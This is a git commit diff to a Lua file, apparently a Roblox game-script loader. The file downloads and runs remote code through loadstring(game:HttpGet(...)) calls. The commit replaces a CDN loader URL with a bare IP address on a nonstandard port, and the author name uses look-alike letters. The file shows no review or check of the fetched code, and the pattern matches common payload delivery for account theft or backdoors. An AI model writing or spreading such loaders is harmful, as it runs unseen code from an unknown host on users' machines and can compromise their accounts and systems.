f3b9ff415bbbd9fa72927f8ad145dbb5e7d6df01
BIudnyHoIandan <taeistnkzxx@gmail.com>
2025-09-12 02:01:03 +0500

    Update source.lua

--- source.lua
+++ source.lua
@@ -1,3 +1,3 @@
 loadstring(game:HttpGet('https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/mm2-fix.lua', true))()
 ID="0d0a40e9-48e9-45da-94c2-c75a58369eb9";
-loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
